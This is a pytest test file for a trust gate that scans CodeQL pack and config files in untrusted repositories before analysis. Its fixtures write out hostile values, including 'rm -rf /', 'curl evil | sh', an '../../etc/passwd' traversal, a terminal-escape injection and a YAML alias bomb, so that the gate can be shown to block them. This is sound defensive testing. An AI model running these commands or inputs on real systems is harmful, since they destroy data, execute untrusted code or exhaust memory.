"""Tests for ``core.security.codeql_trust``.

Mirrors the structure of ``test_cc_trust.py``:
  - trust-override reset autouse fixture (the scan is uncached)
  - per-class grouping by source-file shape (no config / pack only /
    config only / both / structural pathologies)
  - asserts both the verdict and the printed output (operator visibility)
"""

from __future__ import annotations

import sys
from pathlib import Path

import pytest

# packages/cve_diff/tests/... — we ensure the repo root is on sys.path so
# tests can run when invoked from a sub-directory pytest.
try:
    sys.path.insert(0, str(Path(__file__).resolve().parents[3]))
except IndexError:                                     # pragma: no cover
    pass

from core.security.codeql_trust import (
    check_repo_codeql_trust,
    set_trust_override,
)


@pytest.fixture(autouse=True)
def _reset_trust_override():
    """Reset the module-level trust flag between tests."""
    set_trust_override(False)
    yield
    set_trust_override(False)


_check = check_repo_codeql_trust


# ---------------------------------------------------------------------------
# No config — silent pass
# ---------------------------------------------------------------------------


class TestNoConfig:
    def test_empty_dir_returns_false_silent(self, tmp_path, capsys):
        assert _check(str(tmp_path)) is False
        assert capsys.readouterr().out == ""

    def test_empty_repo_path_short_circuits(self, tmp_path):
        """``Path("").resolve()`` would yield CWD — guard skips."""
        assert _check("") is False


class TestUnexaminableTarget:
    """A SUPPLIED repo the checker cannot resolve or stat is refused
    (fail-closed), mirroring cc_trust: a "clean" verdict over an
    unexamined path waved the gate open for vanished (TOCTOU),
    mistyped, and pathological paths. The trust override downgrades to
    warn-and-proceed like any real finding."""

    def test_nonexistent_path_refuses(self, tmp_path, capsys):
        assert _check(str(tmp_path / "does-not-exist")) is True
        out = capsys.readouterr().out
        assert "cannot examine" in out
        assert "treating as dangerous" in out

    def test_nonexistent_path_trust_override_proceeds(self, tmp_path, capsys):
        set_trust_override(True)
        assert _check(str(tmp_path / "does-not-exist")) is False
        out = capsys.readouterr().out
        assert "cannot examine" in out
        assert "trust override active" in out

    def test_null_byte_in_path_refuses(self):
        assert _check("./weird\x00path") is True

    def test_very_long_path_refuses(self):
        assert _check("/" + "a" * 10_000) is True

    def test_message_bounds_and_escapes_the_path(self, tmp_path, capsys):
        hostile = str(tmp_path / ("evil\x1b]0;pwned\x07" + "x" * 400))
        assert _check(hostile) is True
        out = capsys.readouterr().out
        assert "\x1b" not in out and "\x07" not in out


class TestIncompleteEnumeration:
    """An enumeration that skipped subtrees is not a verdict: os.walk's
    default skips unlistable dirs silently, so unreadable (or mid-walk
    vanished) subtrees previously yielded "clean" over pack files the
    gate never saw — and modes can flip readable again before
    `codeql database create` runs (the mode-flip TOCTOU variant)."""

    def test_unlistable_subdir_blocks(self, tmp_path, capsys):
        import os as _os
        if _os.geteuid() == 0:
            pytest.skip("root ignores directory mode bits")
        hidden = tmp_path / "vendor"
        hidden.mkdir()
        (hidden / "qlpack.yml").write_text("name: x\n")
        hidden.chmod(0)
        try:
            blocked = _check(str(tmp_path))
        finally:
            hidden.chmod(0o700)
        assert blocked is True
        assert "scan_incomplete" in capsys.readouterr().out

    def test_symlinked_github_to_unreadable_blocks(self, tmp_path, capsys):
        """The one hiding shape the walk lane cannot see: `.github` as
        a SYMLINK (symlinked dirs are listed, never entered — no walk
        error fires) to an unreadable tree holding codeql-config.yml.
        Only the os.lstat presence probe reaches it; the pathlib-based
        probe swallowed the EACCES on 3.13+ and scanned nothing."""
        import os as _os
        if _os.geteuid() == 0:
            pytest.skip("root ignores directory mode bits")
        hidden = tmp_path / "hidden"
        (hidden / "codeql").mkdir(parents=True)
        (hidden / "codeql" / "codeql-config.yml").write_text("packs: [x]\n")
        repo = tmp_path / "repo"
        repo.mkdir()
        (repo / ".github").symlink_to(hidden)
        hidden.chmod(0)
        try:
            blocked = _check(str(repo))
        finally:
            hidden.chmod(0o700)
        assert blocked is True
        assert "oversized/unreadable" in capsys.readouterr().out

    def test_path_present_probe_error_reports_present(self, monkeypatch):
        """Version-stable probe semantics: pathlib's exists()/is_symlink()
        raise on probe errors on ≤3.12 and swallow to False on 3.13+ —
        both wrong here. The os.lstat probe reports EACCES-class errors
        as present (scanned → blocked) and only ENOENT/ENOTDIR as
        absent."""
        from core.security.codeql_trust import _path_present
        import os as _os

        def _raise(err):
            def _l(_p):
                raise OSError(err, _os.strerror(err))
            return _l

        import errno as _errno
        monkeypatch.setattr(_os, "lstat", _raise(_errno.EACCES))
        assert _path_present(Path("/probe/denied")) is True
        monkeypatch.setattr(_os, "lstat", _raise(_errno.ENOENT))
        assert _path_present(Path("/probe/gone")) is False
        monkeypatch.setattr(_os, "lstat", _raise(_errno.ENOTDIR))
        assert _path_present(Path("/probe/notdir")) is False

    def test_unlistable_target_root_blocks(self, tmp_path, capsys):
        import os as _os
        if _os.geteuid() == 0:
            pytest.skip("root ignores directory mode bits")
        repo = tmp_path / "repo"
        repo.mkdir()
        # stat needs only traversal to the dir (parent +x); listing
        # needs the dir's own read bit — mode 0 is stat-able, unlistable
        repo.chmod(0)
        try:
            blocked = _check(str(repo))
        finally:
            repo.chmod(0o700)
        assert blocked is True
        assert "scan_incomplete" in capsys.readouterr().out


# ---------------------------------------------------------------------------
# codeql-pack.yml / qlpack.yml scanning
# ---------------------------------------------------------------------------


class TestPackFile:
    def test_canonical_only_silent(self, tmp_path, capsys):
        """Pure ``codeql/...`` deps are the canonical case — informative
        only, never blocking. Also no extractor / hooks."""
        (tmp_path / "qlpack.yml").write_text(
            "name: my/pack\n"
            "version: 0.0.1\n"
            "dependencies:\n"
            "  codeql/python-all: '*'\n"
        )
        assert _check(str(tmp_path)) is False
        # No findings → no print
        assert capsys.readouterr().out == ""

    def test_extractor_blocks(self, tmp_path, capsys):
        (tmp_path / "codeql-pack.yml").write_text(
            "name: attacker/evil\n"
            "extractor: ./build/evil-binary\n"
        )
        assert _check(str(tmp_path)) is True
        out = capsys.readouterr().out
        assert "extractor" in out
        # Masked rendering: identifying prefix only — extractor command
        # lines can embed credentials and scan output is CI-retained.
        assert "./build/" in out
        assert "evil-binary" not in out
        assert "***" in out

    def test_non_canonical_dependency_blocks(self, tmp_path, capsys):
        (tmp_path / "qlpack.yml").write_text(
            "name: my/pack\n"
            "dependencies:\n"
            "  evilcorp/exploits: '*'\n"
            "  codeql/python-all: '*'\n"
        )
        assert _check(str(tmp_path)) is True
        out = capsys.readouterr().out
        assert "non-canonical dep" in out
        assert "evilcorp/exploits" in out
        # Canonical dep should NOT trigger a finding line of its own.
        assert "codeql/python-all" not in out.split("non-canonical dep")[1]

    def test_namespace_traversal_dependency_blocks(self, tmp_path, capsys):
        """``codeql/../evil-pack`` shares the canonical prefix but names
        a different namespace — a bare startswith test accepted it."""
        (tmp_path / "qlpack.yml").write_text(
            "name: my/pack\n"
            "dependencies:\n"
            "  codeql/../evil-pack: '*'\n"
        )
        assert _check(str(tmp_path)) is True
        out = capsys.readouterr().out
        assert "non-canonical dep" in out

    def test_versioned_canonical_dependency_list_silent(self, tmp_path, capsys):
        # Two-direction guard: the list form carries ``name@version``
        # specs — a well-formed canonical spec must stay silent.
        (tmp_path / "qlpack.yml").write_text(
            "name: my/pack\n"
            "dependencies:\n"
            "  - codeql/cpp-all@1.0.0\n"
        )
        assert _check(str(tmp_path)) is False
        assert capsys.readouterr().out == ""

    def test_build_command_blocks(self, tmp_path, capsys):
        (tmp_path / "qlpack.yml").write_text(
            "name: my/pack\n"
            "buildCommand: rm -rf /\n"
        )
        assert _check(str(tmp_path)) is True
        assert "buildCommand" in capsys.readouterr().out

    def test_pre_compile_script_blocks(self, tmp_path, capsys):
        (tmp_path / "qlpack.yml").write_text(
            "name: my/pack\n"
            "preCompileScript: ./setup.sh\n"
        )
        assert _check(str(tmp_path)) is True
        assert "preCompileScript" in capsys.readouterr().out

    def test_dependencies_as_list_blocks(self, tmp_path, capsys):
        """Adversarial: YAML is permissive enough that ``dependencies``
        could be expressed as a flat list rather than the documented
        dict form. The check must inspect both shapes — earlier the
        dict-only ``isinstance`` guard let list-form deps slip past."""
        (tmp_path / "qlpack.yml").write_text(
            "name: x\n"
            "dependencies:\n"
            "  - evilcorp/exploit\n"
            "  - codeql/python-all\n"
        )
        assert _check(str(tmp_path)) is True
        out = capsys.readouterr().out
        assert "non-canonical dep" in out
        assert "evilcorp/exploit" in out

    def test_default_suite_file_traversal_blocks(self, tmp_path, capsys):
        """Adversarial: ``defaultSuiteFile`` with ``../`` or absolute
        path escapes the pack and references operator-side files."""
        (tmp_path / "qlpack.yml").write_text(
            "name: x\n"
            "defaultSuiteFile: ../../etc/passwd\n"
        )
        assert _check(str(tmp_path)) is True
        assert "defaultSuiteFile" in capsys.readouterr().out

    def test_default_suite_file_local_silent(self, tmp_path, capsys):
        """Pack-relative defaultSuiteFile is the canonical case — no
        traversal, no flag."""
        (tmp_path / "qlpack.yml").write_text(
            "name: x\n"
            "defaultSuiteFile: my-suite.qls\n"
        )
        assert _check(str(tmp_path)) is False
        assert capsys.readouterr().out == ""

    def test_extractor_falsy_silent(self, tmp_path, capsys):
        """``extractor: null`` and ``extractor: ""`` aren't real
        extractor declarations — no flag."""
        (tmp_path / "qlpack.yml").write_text(
            "name: x\n"
            "extractor: null\n"
        )
        assert _check(str(tmp_path)) is False
        assert capsys.readouterr().out == ""

    def test_malformed_yaml_blocks(self, tmp_path, capsys):
        (tmp_path / "qlpack.yml").write_text("name: [broken yaml\n  unbalanced")
        assert _check(str(tmp_path)) is True
        assert "malformed YAML" in capsys.readouterr().out

    def test_non_dict_root_blocks(self, tmp_path, capsys):
        (tmp_path / "qlpack.yml").write_text("- just\n- a\n- list\n")
        assert _check(str(tmp_path)) is True
        assert "non-dict YAML" in capsys.readouterr().out

    def test_walks_nested_dirs(self, tmp_path, capsys):
        """codeql walks the source root for pack files; we must too."""
        nested = tmp_path / "deeply" / "nested" / "subdir"
        nested.mkdir(parents=True)
        (nested / "qlpack.yml").write_text(
            "name: my/pack\n"
            "extractor: ./hidden\n"
        )
        assert _check(str(tmp_path)) is True
        assert "extractor" in capsys.readouterr().out

    def test_skips_dotted_dirs(self, tmp_path, capsys):
        """``.git`` / ``.claude/worktrees`` shouldn't be walked — their
        contents aren't part of the pack codeql will load."""
        hidden = tmp_path / ".claude" / "worktrees" / "x"
        hidden.mkdir(parents=True)
        (hidden / "qlpack.yml").write_text(
            "name: my/pack\n"
            "extractor: ./evil\n"
        )
        assert _check(str(tmp_path)) is False
        assert capsys.readouterr().out == ""

    def test_scans_dot_github(self, tmp_path, capsys):
        """``.github`` IS walked because that's where codeql-config.yml
        legitimately lives."""
        gh = tmp_path / ".github" / "codeql"
        gh.mkdir(parents=True)
        (gh / "codeql-config.yml").write_text(
            "name: x\n"
            "manualBuildSteps:\n"
            "  - 'sh evil.sh'\n"
        )
        assert _check(str(tmp_path)) is True
        assert "manualBuildSteps" in capsys.readouterr().out


# ---------------------------------------------------------------------------
# .github/codeql/codeql-config.yml scanning
# ---------------------------------------------------------------------------


class TestCodeqlConfig:
    def _write_config(self, tmp_path: Path, body: str) -> None:
        gh = tmp_path / ".github" / "codeql"
        gh.mkdir(parents=True)
        (gh / "codeql-config.yml").write_text(body)

    def test_canonical_packs_only_silent(self, tmp_path, capsys):
        self._write_config(tmp_path,
            "name: ok\n"
            "packs:\n"
            "  python:\n"
            "    - codeql/python-queries\n"
        )
        assert _check(str(tmp_path)) is False
        assert capsys.readouterr().out == ""

    def test_non_canonical_pack_blocks(self, tmp_path, capsys):
        self._write_config(tmp_path,
            "name: x\n"
            "packs:\n"
            "  python:\n"
            "    - evilcorp/all\n"
            "    - codeql/python-queries\n"
        )
        assert _check(str(tmp_path)) is True
        out = capsys.readouterr().out
        assert "non-canonical pack" in out
        assert "evilcorp/all" in out

    def test_namespace_traversal_pack_blocks(self, tmp_path, capsys):
        self._write_config(tmp_path,
            "name: x\n"
            "packs:\n"
            "  python:\n"
            "    - codeql/../evil-pack\n"
        )
        assert _check(str(tmp_path)) is True
        out = capsys.readouterr().out
        assert "non-canonical pack" in out

    def test_canonical_pack_with_version_and_suite_path_silent(
        self, tmp_path, capsys,
    ):
        # Two-direction guard: the codeql-config pack syntax allows
        # ``scope/name@version:path`` — a canonical pack with an
        # in-pack suite path must stay silent.
        self._write_config(tmp_path,
            "name: ok\n"
            "packs:\n"
            "  python:\n"
            "    - codeql/python-queries@~7.0.0:codeql-suites/python-security.qls\n"
        )
        assert _check(str(tmp_path)) is False
        assert capsys.readouterr().out == ""

    def test_canonical_pack_suite_path_traversal_blocks(
        self, tmp_path, capsys,
    ):
        self._write_config(tmp_path,
            "name: x\n"
            "packs:\n"
            "  python:\n"
            "    - codeql/python-queries:../outside/suite.qls\n"
        )
        assert _check(str(tmp_path)) is True
        out = capsys.readouterr().out
        assert "non-canonical pack" in out

    def test_external_query_blocks(self, tmp_path, capsys):
        self._write_config(tmp_path,
            "name: x\n"
            "queries:\n"
            "  - uses: evilcorp/queries/main\n"
        )
        assert _check(str(tmp_path)) is True
        assert "external queries" in capsys.readouterr().out

    def test_relative_local_query_silent(self, tmp_path, capsys):
        self._write_config(tmp_path,
            "name: x\n"
            "queries:\n"
            "  - uses: ./local-suite.qls\n"
        )
        assert _check(str(tmp_path)) is False
        assert capsys.readouterr().out == ""

    def test_manual_build_steps_blocks(self, tmp_path, capsys):
        self._write_config(tmp_path,
            "name: x\n"
            "manualBuildSteps:\n"
            "  - 'sh evil.sh'\n"
        )
        assert _check(str(tmp_path)) is True
        assert "manualBuildSteps" in capsys.readouterr().out

    def test_flat_packs_list(self, tmp_path, capsys):
        self._write_config(tmp_path,
            "name: x\n"
            "packs:\n"
            "  - evilcorp/all\n"
        )
        assert _check(str(tmp_path)) is True
        assert "non-canonical pack" in capsys.readouterr().out

    def test_pack_cache_blocks(self, tmp_path, capsys):
        """Adversarial: ``pack-cache`` redirects codeql's pack download
        cache. A malicious target could point it at a pre-stocked
        in-repo directory so codeql 'downloads' attacker-supplied
        packs from there."""
        self._write_config(tmp_path,
            "name: x\n"
            "pack-cache: /attacker/cache\n"
        )
        assert _check(str(tmp_path)) is True
        assert "pack-cache" in capsys.readouterr().out


# ---------------------------------------------------------------------------
# Structural pathologies (oversize, symlink, RAPTOR self-scan)
# ---------------------------------------------------------------------------


class TestStructural:
    def test_symlink_pack_file_blocks(self, tmp_path, capsys):
        target = tmp_path / "real.yml"
        target.write_text("name: real/pack\n")
        link = tmp_path / "qlpack.yml"
        link.symlink_to(target)
        assert _check(str(tmp_path)) is True
        assert "symlink" in capsys.readouterr().out

    def test_oversized_pack_file_blocks(self, tmp_path, capsys):
        # 2 MiB pack file — beyond the 1 MiB cap.
        big = "name: x\n" + ("# pad\n" * 350_000)
        (tmp_path / "qlpack.yml").write_text(big)
        assert _check(str(tmp_path)) is True
        assert "oversized" in capsys.readouterr().out

    def test_raptor_self_scan_short_circuits(self, capsys):
        """Operator running RAPTOR against RAPTOR itself isn't an
        attack — RAPTOR ships its own codeql packs under
        packages/llm_analysis/codeql_packs/."""
        # The module's _RAPTOR_DIR = parents[2] of the module file
        # (core/security/codeql_trust.py), which is the repo root.
        # Use the same.
        from core.security.codeql_trust import _RAPTOR_DIR
        assert _check(str(_RAPTOR_DIR)) is False
        assert capsys.readouterr().out == ""


# ---------------------------------------------------------------------------
# Trust override
# ---------------------------------------------------------------------------


class TestTrustOverride:
    def test_module_flag_unblocks(self, tmp_path, capsys):
        (tmp_path / "qlpack.yml").write_text(
            "name: x\nextractor: ./evil\n"
        )
        # First confirm without override blocks.
        assert _check(str(tmp_path)) is True
        capsys.readouterr()  # drop output
        # Set override and confirm pass + override-active warning.
        set_trust_override(True)
        assert _check(str(tmp_path)) is False
        out = capsys.readouterr().out
        assert "trust override active" in out
        assert "extractor" in out

    def test_explicit_arg_overrides_module_flag(self, tmp_path, capsys):
        (tmp_path / "qlpack.yml").write_text(
            "name: x\nextractor: ./evil\n"
        )
        set_trust_override(True)
        # Explicit False forces strict regardless of module flag.
        assert _check(str(tmp_path), trust_override=False) is True

    def test_override_when_no_findings_no_warning(self, tmp_path, capsys):
        (tmp_path / "qlpack.yml").write_text("name: my/pack\n")
        set_trust_override(True)
        assert _check(str(tmp_path)) is False
        # Empty pack file produces no findings → nothing printed even
        # with override active.
        assert capsys.readouterr().out == ""


# ---------------------------------------------------------------------------
# Combined + display sanity
# ---------------------------------------------------------------------------


class TestCombined:
    def test_pack_plus_config_both_reported(self, tmp_path, capsys):
        (tmp_path / "qlpack.yml").write_text(
            "name: x\nextractor: ./bad\n"
        )
        gh = tmp_path / ".github" / "codeql"
        gh.mkdir(parents=True)
        (gh / "codeql-config.yml").write_text(
            "name: y\npacks:\n  - evil/pack\n"
        )
        assert _check(str(tmp_path)) is True
        out = capsys.readouterr().out
        assert "extractor" in out
        assert "non-canonical pack" in out
        assert "qlpack.yml" in out
        assert "codeql-config.yml" in out

    def test_findings_use_safe_truncation(self, tmp_path, capsys):
        """Long extractor values are masked: prefix + length, no dump."""
        long_extractor = "./" + "evil" * 100  # 402 chars
        (tmp_path / "qlpack.yml").write_text(
            f"name: x\nextractor: '{long_extractor}'\n"
        )
        _check(str(tmp_path))
        out = capsys.readouterr().out
        assert "*** (402 chars)" in out
        # Doesn't dump the full 400+ chars
        assert long_extractor not in out


# ---------------------------------------------------------------------------
# Pack-file cap warning
# ---------------------------------------------------------------------------


class TestPackFileCapWarning:
    """The pack-file walker caps at _MAX_PACK_FILES. Verify a warning is
    emitted so operators know additional files were NOT inspected."""

    @pytest.mark.slow
    def test_warning_emitted_when_cap_reached(self, tmp_path, caplog):
        import logging

        from core.security.codeql_trust import _MAX_PACK_FILES, _scan_repo

        for i in range(_MAX_PACK_FILES + 5):
            d = tmp_path / f"pkg{i:04d}"
            d.mkdir()
            (d / "qlpack.yml").write_text(f"name: test/pkg{i}\nversion: 1.0.0\n")

        with caplog.at_level(logging.WARNING, logger="core.security.codeql_trust"):
            _scan_repo(str(tmp_path.resolve()))

        assert any("capped at" in rec.message for rec in caplog.records), (
            "Expected a warning about the pack-file cap being reached"
        )
        assert str(_MAX_PACK_FILES) in caplog.text

    def test_no_warning_below_cap(self, tmp_path, caplog):
        import logging

        from core.security.codeql_trust import _scan_repo

        for i in range(2):
            d = tmp_path / f"pkg{i}"
            d.mkdir()
            (d / "qlpack.yml").write_text(f"name: test/pkg{i}\nversion: 1.0.0\n")

        with caplog.at_level(logging.WARNING, logger="core.security.codeql_trust"):
            _scan_repo(str(tmp_path.resolve()))

        assert not any("capped at" in rec.message for rec in caplog.records)


# ---------------------------------------------------------------------------
# Regression: scalar string values in packs dict silently dropped
# ---------------------------------------------------------------------------


class TestScalarPackValue:
    def test_scalar_string_pack_ref_detected(self, tmp_path, capsys):
        """A codeql-config.yml where one language key has a scalar string
        pack reference (not wrapped in a list). Pre-fix: the ``isinstance
        (refs, list)`` guard silently dropped scalar strings; the
        non-canonical pack slipped through undetected.

        After fix: ``elif isinstance(refs, str)`` catches the scalar and
        appends it to the flat list for inspection."""
        gh = tmp_path / ".github" / "codeql"
        gh.mkdir(parents=True)
        (gh / "codeql-config.yml").write_text(
            "name: x\n"
            "packs:\n"
            "  python: evilcorp/backdoor\n"  # scalar string, not a list
        )
        assert _check(str(tmp_path)) is True
        out = capsys.readouterr().out
        assert "non-canonical pack" in out
        assert "evilcorp/backdoor" in out


# ---------------------------------------------------------------------------
# Capped enumeration is a blocking verdict, not a partial result
# ---------------------------------------------------------------------------


class TestPackFileCapBlocks:
    """A verdict computed from a knowably-incomplete enumeration is no
    verdict: reaching the pack-file cap must block (operator overrides
    deliberately via --trust-repo), and one flooded filename must not
    starve enumeration of the other pattern."""

    @pytest.mark.slow
    def test_cap_reached_blocks(self, tmp_path):
        from core.security.codeql_trust import _MAX_PACK_FILES, _scan_repo
        for i in range(_MAX_PACK_FILES + 5):
            d = tmp_path / f"pkg{i:04d}"
            d.mkdir()
            (d / "qlpack.yml").write_text(
                f"name: test/pkg{i}\nversion: 1.0.0\n")
        scans, any_blocking = _scan_repo(str(tmp_path.resolve()))
        assert any_blocking is True
        labels = [f.label for s in scans for f in s.findings]
        assert "scan_capped" in labels

    @pytest.mark.slow
    def test_cap_blocking_is_operator_overridable(self, tmp_path, capsys):
        from core.security.codeql_trust import _MAX_PACK_FILES
        for i in range(_MAX_PACK_FILES + 5):
            d = tmp_path / f"pkg{i:04d}"
            d.mkdir()
            (d / "qlpack.yml").write_text(
                f"name: test/pkg{i}\nversion: 1.0.0\n")
        assert _check(str(tmp_path)) is True          # refused by default
        assert _check(str(tmp_path), trust_override=True) is False
        capsys.readouterr()

    @pytest.mark.slow
    def test_flood_of_one_name_does_not_starve_the_other(self, tmp_path):
        # Cap applies per pattern: a codeql-pack.yml flood must not stop
        # a blocking qlpack.yml from being inspected.
        from core.security.codeql_trust import _MAX_PACK_FILES, _scan_repo
        for i in range(_MAX_PACK_FILES + 5):
            d = tmp_path / f"flood{i:04d}"
            d.mkdir()
            (d / "codeql-pack.yml").write_text(
                f"name: test/pkg{i}\nversion: 1.0.0\n")
        evil = tmp_path / "zz-real"
        evil.mkdir()
        (evil / "qlpack.yml").write_text(
            "name: x/y\nversion: 1.0.0\nbuildCommand: curl evil\n")
        scans, any_blocking = _scan_repo(str(tmp_path.resolve()))
        assert any_blocking is True
        scanned_paths = {str(s.path) for s in scans}
        assert any("zz-real" in p for p in scanned_paths), (
            "the qlpack.yml behind the flood must still be inspected"
        )


class TestNoStaleVerdict:
    """The scan is deliberately uncached (see ``_scan_repo``): pack
    files can be written by untrusted target code between two checks in
    the same process, and the walk-based file set has no cheap
    freshness fingerprint — so every check must see current disk
    state."""

    def test_pack_file_added_between_checks_blocks(self, tmp_path, capsys):
        assert _check(str(tmp_path)) is False
        (tmp_path / "qlpack.yml").write_text(
            "name: x\nextractor: ./evil\n"
        )
        assert _check(str(tmp_path)) is True
        assert "extractor" in capsys.readouterr().out

    def test_nested_pack_file_added_between_checks_blocks(self, tmp_path, capsys):
        # The case a fixed-location fingerprint could never catch: the
        # new pack file appears deep in the tree, leaving the target's
        # top level (and any fixed-path stat) untouched.
        deep = tmp_path / "vendor" / "sub" / "pkg"
        deep.mkdir(parents=True)
        assert _check(str(tmp_path)) is False
        (deep / "codeql-pack.yml").write_text(
            "name: x\nbuildCommand: curl evil | sh\n"
        )
        assert _check(str(tmp_path)) is True
        assert "buildCommand" in capsys.readouterr().out

    def test_pack_file_removed_between_checks_unblocks(self, tmp_path, capsys):
        pack = tmp_path / "qlpack.yml"
        pack.write_text("name: x\nextractor: ./evil\n")
        assert _check(str(tmp_path)) is True
        pack.unlink()
        assert _check(str(tmp_path)) is False
        capsys.readouterr()


class TestExtraStripSpelling:
    """The U+2028/U+2029 strip set must work AND stay visibly spelled.

    The set was once written with the literal (invisible) characters:
    indistinguishable in an editor from two quoted blanks, so an
    accidental "cleanup" to real spaces would have silently disabled
    the line-separator defence while corrupting every space in
    sanitised output. Pin both the behaviour and the escaped source
    spelling (matching cc_trust)."""

    def test_line_separators_stripped(self):
        from core.security.codeql_trust import _EXTRA_STRIP, _safe
        # chr() spellings so THIS file carries no invisible
        # literals either.
        _ls, _ps = chr(0x2028), chr(0x2029)
        assert _EXTRA_STRIP == {_ls, _ps}
        assert _safe(f"a{_ls}b{_ps}c") == "a?b?c"
        # Ordinary spaces must survive — the failure mode the literal
        # spelling invited.
        assert _safe("a b") == "a b"

    def test_source_uses_escaped_forms(self):
        import core.security.codeql_trust as mod
        src = Path(mod.__file__).read_text(encoding="utf-8")
        assert chr(0x2028) not in src and chr(0x2029) not in src, (
            "codeql_trust.py contains literal U+2028/U+2029 — use "
            "the escaped spellings so the set stays reviewable")
        # The escaped spellings are present in the source text.
        assert "u2028" in src and "u2029" in src


# ---------------------------------------------------------------------------
# Directory-symlink containment (hostile-repo walk)
# ---------------------------------------------------------------------------


class TestWalkNeverFollowsDirectorySymlinks:
    """pathlib's ``**`` follows directory symlinks on every Python
    before 3.13; the scan runs against untrusted repos BEFORE
    ``codeql database create``, so a repo shipping ``dir -> <host
    path>`` must not steer the trust gate at host files (or into a
    symlink loop). The walk is pinned to os.walk(followlinks=False)
    semantics on every supported interpreter."""

    def test_out_of_repo_dir_symlink_not_followed(self, tmp_path, capsys):
        outside = tmp_path / "outside"
        (outside / "pack").mkdir(parents=True)
        (outside / "pack" / "qlpack.yml").write_text(
            "extractor: /bin/evil\n")
        repo = tmp_path / "repo"
        repo.mkdir()
        (repo / "vendored").symlink_to(outside, target_is_directory=True)
        # Host-side pack content behind the link must NOT surface as a
        # repo finding (nor block dispatch).
        assert _check(str(repo)) is False
        assert "qlpack" not in capsys.readouterr().out

    def test_symlink_loop_terminates_and_scans_real_files(
        self, tmp_path, capsys,
    ):
        repo = tmp_path / "repo"
        (repo / "a").mkdir(parents=True)
        (repo / "a" / "loop").symlink_to(repo, target_is_directory=True)
        (repo / "qlpack.yml").write_text("extractor: /bin/evil\n")
        # Terminates (no unbounded walk) and the real blocking file is
        # still found exactly once.
        assert _check(str(repo)) is True
        assert capsys.readouterr().out.count("extractor") == 1

    def test_dir_symlink_named_like_pack_file_still_blocks(
        self, tmp_path, capsys,
    ):
        """A symlink NAMED qlpack.yml (even one pointing at a
        directory) is a structural blocking finding, same as the
        file-symlink case."""
        outside = tmp_path / "outside-dir"
        outside.mkdir()
        repo = tmp_path / "repo"
        repo.mkdir()
        (repo / "qlpack.yml").symlink_to(
            outside, target_is_directory=True)
        assert _check(str(repo)) is True
        assert "symlink" in capsys.readouterr().out


class TestHostileYamlBounded:
    """Hostile YAML must yield a blocking finding (Untrusted verdict,
    loud reason) — never a crash of the operator process the gate
    runs in. The alias-amplification shape (`aN: &aN [*a(N-1),*a(N-1)]`
    + `extractor: *aN`) turned ~600 bytes into a 2^depth expansion at
    the scanner's ``str()``; flow/block deep nesting abuses the loader
    stack instead."""

    @staticmethod
    def _alias_bomb(depth: int) -> str:
        lines = ['a0: &a0 ["xxxxxxxx","xxxxxxxx"]']
        for i in range(1, depth + 1):
            lines.append(f"a{i}: &a{i} [*a{i - 1},*a{i - 1}]")
        lines.append(f"extractor: *a{depth}")
        return "\n".join(lines) + "\n"

    def test_alias_refused_in_process(self, tmp_path):
        from core.security.codeql_trust import _scan_pack_file
        p = tmp_path / "qlpack.yml"
        p.write_text(self._alias_bomb(3))
        fs = _scan_pack_file(p)
        assert fs.has_blocking()
        labels = {f.label for f in fs.findings}
        assert "malformed YAML" in labels
        assert any("alias" in f.value for f in fs.findings)

    def test_alias_bomb_bounded_under_memory_cap(self, tmp_path):
        """Depth-30 bomb (~660 bytes → tens of GiB if expanded) under
        a 2 GiB address-space cap: must exit cleanly with a blocking
        malformed-YAML finding, not die on memory exhaustion."""
        import subprocess
        p = tmp_path / "qlpack.yml"
        p.write_text(self._alias_bomb(30))
        code = (
            "import resource, sys\n"
            "resource.setrlimit(resource.RLIMIT_AS,"
            " (2 << 30, 2 << 30))\n"
            "from core.security.codeql_trust import _scan_pack_file\n"
            "fs = _scan_pack_file(__import__('pathlib').Path(sys.argv[1]))\n"
            "assert fs.has_blocking()\n"
            "assert any(f.label == 'malformed YAML' for f in fs.findings)\n"
            "print('BLOCKED-CLEANLY')\n"
        )
        proc = subprocess.run(
            [sys.executable, "-c", code, str(p)],
            capture_output=True, text=True, timeout=60,
            cwd=str(Path(__file__).resolve().parents[3]),
        )
        assert proc.returncode == 0, proc.stderr[-2000:]
        assert "BLOCKED-CLEANLY" in proc.stdout

    def test_deep_flow_nesting_refused(self, tmp_path):
        from core.security.codeql_trust import _scan_pack_file
        p = tmp_path / "qlpack.yml"
        p.write_text("extractor: " + "[" * 5000 + "]" * 5000 + "\n")
        fs = _scan_pack_file(p)
        assert fs.has_blocking()
        assert any("flow nesting" in f.value for f in fs.findings)

    def test_deep_block_nesting_refused_not_crash(self, tmp_path):
        """Second stack-abuse encoding: block-mapping depth (no flow
        brackets, so the pre-bound never fires) must surface as the
        blocking malformed-YAML finding via the escape-error catch."""
        from core.security.codeql_trust import _scan_pack_file
        depth = 20_000
        p = tmp_path / "qlpack.yml"
        p.write_text("".join(f"{' ' * i}k:\n" for i in range(depth)))
        fs = _scan_pack_file(p)
        assert fs.has_blocking()

    def test_container_extractor_flagged_without_stringify(self, tmp_path):
        from core.security.codeql_trust import _scan_pack_file
        p = tmp_path / "qlpack.yml"
        p.write_text("extractor:\n  - a\n  - b\n")
        fs = _scan_pack_file(p)
        assert any(f.label == "extractor (unrecognised shape)"
                   and f.blocking for f in fs.findings)

    def test_container_dep_flagged_without_stringify(self, tmp_path):
        from core.security.codeql_trust import _scan_pack_file
        p = tmp_path / "qlpack.yml"
        p.write_text("dependencies:\n  codeql/cpp-all:\n    nested: {a: 1}\n")
        fs = _scan_pack_file(p)
        assert fs.has_blocking()
        assert any("unrecognised shape" in f.label for f in fs.findings)

    def test_config_yaml_alias_refused(self, tmp_path):
        from core.security.codeql_trust import _scan_codeql_config
        cfg = tmp_path / "codeql-config.yml"
        cfg.write_text(self._alias_bomb(3))
        fs = _scan_codeql_config(cfg)
        assert fs.has_blocking()

    def test_benign_pack_shapes_unchanged(self, tmp_path):
        """Two-direction pin: the fix must not reclassify legitimate
        pack files — canonical deps (dict and null-version forms) stay
        silent, a string extractor still blocks under its own label."""
        from core.security.codeql_trust import _scan_pack_file
        p = tmp_path / "qlpack.yml"
        p.write_text(
            "name: my/pack\nversion: 0.0.1\n"
            "dependencies:\n  codeql/cpp-all: '*'\n  codeql/ssa:\n"
        )
        assert _scan_pack_file(p).findings == []
        p.write_text("extractor: cpp\n")
        fs = _scan_pack_file(p)
        assert [f.label for f in fs.findings] == ["extractor"]
        assert fs.has_blocking()
